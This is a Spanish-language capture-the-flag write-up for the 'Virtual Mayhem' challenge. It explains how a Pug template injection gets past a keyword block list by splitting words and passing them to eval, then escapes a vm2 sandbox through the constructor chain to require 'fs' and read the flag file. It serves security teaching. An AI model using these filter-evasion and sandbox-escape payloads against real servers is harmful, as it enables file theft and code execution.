# Virtual Mayhem

![2025-03-25-105204_726x348_scrot](https://github.com/user-attachments/assets/378ff069-3d03-400f-9539-849ad3fbbe94)

Podemos insertar plantillas de PugJs y renderizarlas en la pagina, pero existen restricciones

No se pueden usar las siguientes expresiones regulares:

``` javascript
function sanitizeTemplate(template) {
  const forbiddenPatterns = [
    /require/i,
    /process/i,
    /Function/i,
    /global/i,
    /mainModule/i,
    /\bfs\b/i
  ];

  for (const pattern of forbiddenPatterns) {
    if (pattern.test(template)) {
      throw new Error('Forbidden keyword or pattern detected in template.');
    }
  }
```

Esto se puede esquivar separando las palabras y luego agregando el string a un eval

Por ejemplo, se pueden cargar nuevos modulos dinamicamente usando `global.process.mainModule.require('module')`, normalmente en PugJs una variable para el modulo se veria asi:

``` pugjs
- const fsModule = global.process.mainModule.require('fs')
```

Pero debido a que no podemos escrbir 'fs' ni 'mainModule' ni 'global' ni 'process' debemos separarlos y ejecutarlos con un eval:

``` pugjs
- const fm = eval("glb.proc" + "ess.mainMo" + "dule.requi"+ "re('f" + "s')")
```

Con eso podriamos leer la flag y mostrarla en pantalla:
``` pugjs
- const fm = eval("glb.proc" + "ess.mainMo" + "dule.requi"+ "re('f" + "s')")
- const flag = fm.readFileSync('./flag.txt','utf-8')
.p #{flag}
```

Pero no funciona porque la plantilla es ejecutada en una maquina virtual, sin acceso al entorno global:
``` javascript
    const compiledTemplate = pug.compile(userTemplate);
    const vm = new VM({ timeout: 1000, sandbox: { username: "Player" } });
    const output = vm.run(`\`${compiledTemplate({})}\``);
```

- En el contexto de la VM, this normalmente apunta al objeto sandbox proporcionado ({username: "Player"})
- Object.getPrototypeOf(this) obtiene el prototipo de objeto `Object.prototype`
- sandboxPrototype.constructor obtiene el constructor del objeto (normalmente `Object()`) porque los literales de objeto se crean con new Object()
- sandbox.Prototype.constructor.constructor obtiene el constructor del constructor (normalmente `Function()`)
- sandbox.Prototype.constructor.constructor('return this')() Ejecuta la funcion y devuelve this
- `Cuando una función se llama en modo no estricto, su this apunta al objeto global`

Y con eso tenemos acceso a `global`

![2025-03-22-151832_780x488_scrot](https://github.com/user-attachments/assets/d69bc16f-a7c1-4fae-9bd9-e70ee914d97e)

![2025-03-22-151842_766x545_scrot](https://github.com/user-attachments/assets/ddb44833-a944-4724-9395-360d30455f5e)

`MetaCTF{m4st3r1ng_pug_s4ndb0x_3sc4p3}`
